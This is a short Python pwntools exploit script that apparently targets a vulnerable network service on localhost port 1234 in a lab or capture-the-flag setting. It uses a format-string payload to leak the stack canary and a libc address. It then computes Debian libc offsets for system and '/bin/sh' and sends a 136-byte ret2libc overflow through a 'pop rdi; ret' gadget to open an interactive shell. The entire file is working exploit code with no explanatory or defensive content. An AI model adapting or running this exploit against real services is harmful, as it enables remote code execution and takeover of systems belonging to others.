from pwn import *

# Addresses
offsetLeakLibc = 0x3998c0
systemOffset = 0x0003f450 #debian
binshOffset = 0x1619f9 #debian 
prOffset = 0x3c7ba # pop rdi; ret

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)
    
    # info leak
    r.sendline("%p." * 22)
    leak = r.recv()
    
    libcLeak = int(leak[54:66], 16)
    log.info("libcLeak = " + hex(libcLeak))
    libcBase = libcLeak - offsetLeakLibc
    log.info("libcBase = " + hex(libcBase))
    libcSystem = libcBase + systemOffset
    log.info("libcSystem = " + hex(libcSystem))
    libcBinSh = libcBase + binshOffset
    log.info("libcBinSh = " + hex(libcBinSh))
    canary = int(leak[325:341], 16)
    log.info("canary = " + hex(canary))
    libcPr = libcBase + prOffset
    log.info("popRet = " + hex(libcPr))

    # exploit
    exploit = "A" * 136
    exploit += p64(canary)
    exploit += "B" * 8
    exploit += p64(libcPr)
    exploit += p64(libcBinSh)
    exploit += p64(libcSystem)
    r.sendline(exploit)
    
    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
